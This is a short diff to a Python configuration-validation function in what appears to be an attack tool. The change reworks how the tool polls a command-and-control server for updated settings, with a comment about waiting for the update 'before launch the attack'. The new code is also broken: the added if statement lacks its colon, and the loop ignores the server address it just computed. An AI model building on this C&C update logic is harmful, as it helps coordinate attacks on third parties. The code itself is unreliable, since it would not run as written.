@@ -75,15 +75,22 @@ def validateConfigFile(config_file, override, ccserver=None):
             configuration[setting] = rootSchema[setting]
 
     # 1. check for updates connecting to C&C (if not override option is enabled)
-    if (not override) and (ccserver):
-         while True:
-            cc_config, updated = validateCCUpdate(ccserver, rootSchema, int(configuration['last_modified']))
-            # check for remote connection success and update local configuration
-            if updated:
-                configuration = cc_config
-                if not updateConfigFile(config_file, configuration):
-                    return None
-                break
+    if (not override) 
+        # check for ccserver address 
+        ccserveraddr = ccserver
+        if (len(configuration['cc_server']) != 0) and (ccserver is None):
+            ccserveraddr = configuration['cc_server']
+        # waiting for update before launch the attack
+        if ccserveraddr:
+            while True:
+                cc_config, updated = validateCCUpdate(configuration['cc_server'], rootSchema, int(configuration['last_modified']))
+                # check for remote connection success and update local configuration
+                if updated:
+                    configuration = cc_config
+                    if not updateConfigFile(config_file, configuration):
+                        return None
+                    break
+
             
     
     # 2. compare target schema
